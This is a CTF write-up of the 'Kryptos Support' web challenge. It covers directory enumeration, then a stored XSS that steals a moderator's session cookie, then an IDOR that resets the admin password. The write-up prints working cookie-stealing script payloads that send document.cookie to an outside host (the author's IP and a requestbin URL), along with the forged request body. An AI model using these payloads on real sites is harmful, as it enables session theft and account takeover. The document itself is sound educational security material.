---
layout: default
title: Kryptos Support
---

# [Cyber Apocalypse](index.md) - Web - Kryptos Support

> The secret vault used by the Longhir's planet council, Kryptos, contains some very sensitive state secrets that Virgil and Ramona are after to prove the injustice performed by the commission. Ulysses performed an initial recon at their request and found a support portal for the vault. Can you take a look if you can infiltrate this system?

This challenge is a support portal for some kind of vault. The landing page allows the user to enter text in a box and submit this as a ticket for an admin to review. There was no authentication on this page. 

![Kryptos screenshot](web-kryptossupport/screenshot-00.png)

There was a link to the **backend**, which led to a login page.

![Kryptos screenshot](web-kryptossupport/screenshot-01.png)

The login form was not susceptible to a simple SQL injection, so I looked elsewhere.

Using **gobuster** to do a quick scan of the website for different pages and/or API endpoints. I found the following:

```
/admin
/settings
/tickets
/logout
/login
/static
```
`/admin`, `/settings`, and `/tickets` redirected to the login page.

The ticket submit form worked, and when submitting a ticket the page displayed a message indicating that support staff would look at it. 

I noted that the ticket data was submitted to `/api/tickets/add`, so I did some exploring looking for other API endpoints (just manually with Firefox) and did not find much. The login form used `/api/login`, but I was not able to view tickets or logins.

The ticket form did not appear to sanitize it's input, so I decided to try stealing the support staff's cookies with a cross-site scripting attack. A quick google search gave me some example XSS cookie stealing code, which I modified for my own use.

I set up a simple web server on a VM with python, using the following commands:

```
mkdir emptyfolder
cd emptyfolder
python3 -m http.server 1337
```
Then I submitted this javascript code in a ticket, and waited for the response. 

```javscript
<script>var i=new Image;i.src="https://my-ip-address-was-here:1337/?"+document.cookie;</script>
```
The URL of the request contained the cookie information, so I was able to simply copy and paste this from my console window.

Later, I discovered [Requestbin](https://requestbin.io) which would have made this a bit easier, and wouldn't as easily reveal my own IP address.

```javscript
<script>var i=new Image;i.src="https://requestbin.io/1du9x2z1/?"+document.cookie;</script>
```

![Kryptos screenshot](web-kryptossupport/screenshot-03.png)


The cookie data was:
```
session=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6Im1vZGVyYXRvciIsInVpZCI6MTAwLCJpYXQiOjE2NTI2MjgwNDR9.zewYLE5ZOkKHzHJlTA0eGrasx6-31UL5Jo9mhMH5RnE
```


I noted that the session value was a JWT that can be decoded - each section, separated by periods, is just base64 encoded.
```json
{"alg":"HS256","typ":"JWT"}
```
```json
{"username":"moderator","uid":100,"iat":1652628044}
```
*The last section is not legible, it's a signature for the above data*

I noted that the user was named `moderator` and had a `uid` of `100`.

The JWT's signature wouldn't be valid if I modified the uid or username, so I can't easily exploit those at this point.

In Firefox, I created a cookie named `session` with the value `eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6Im1vZGVyYXRvciIsInVpZCI6MTAwLCJpYXQiOjE2NTI2MjgwNDR9.zewYLE5ZOkKHzHJlTA0eGrasx6-31UL5Jo9mhMH5RnE`

In my exploration above, I had found `/tickets`, so with my new cookie I visited that page and was able to view the submitted tickets.


![Kryptos screenshot](web-kryptossupport/screenshot-04.png)

There were two tickets previously submitted which contained some numbers (`000083921` and `000076439`) which I noted for later (but never ended up using). The tickets did not contain names or usernames, so I was not able to get much info from them.


![Kryptos screenshot](web-kryptossupport/screenshot-05.png)

There was a **settings** link, which went to a page that allowed me to change the password of the currently logged in user. Trying this, I was able to reset the password of the **moderator** account. In a "real" engagement, this would make it pretty obvious that the system was compromised, considering the moderator user had just viewed my ticket and was presumably actively using the system, and would notice very quickly that their password had changed to something that they did not know. Luckily, the "moderator" user was just a script because this is just a challenge system, and wouldn't notice a thing.

Using Firefox developer tools, I noticed that changing the password sent a request to the api endpoint `/api/users/update` with the following payload:

```json
{
	"password" : "abc123",
	"uid" : "100"
}
```

Unlike the cookie, there is no cryptographic signature here, so I tried changing the `uid` value to `1`. I figured that in most cases, the admin account will be the first account in the database, so probably would have an ID of 1. I used [Insomnia](https://insomnia.rest/) to send this payload, but I later discovered that Firefox developer tools allow you to edit and re-submit the request, and I could have just used that.

```json
{
	"password" : "abc123",
	"uid" : "1"
}
```

![Kryptos screenshot](web-kryptossupport/screenshot-06.png)

The response from the API was "Password for admin changed successfully", which gave me the admin username.

The "moderator" account clearly had permissions to reset passwords, but the system allowed it to reset *any* user's password, including the admin. Some security probably should have been in place to prevent a user with password reset privileges from resetting passwords of anyone else at the same or higher security levels, or something like that.

Logging out of the moderator account, and into the admin account using `admin` and the password I set granted me access, and displayed the flag.


![Kryptos screenshot](web-kryptossupport/screenshot-07.png)

```
HTB{x55_4nd_id0rs_ar3_fun!!}
```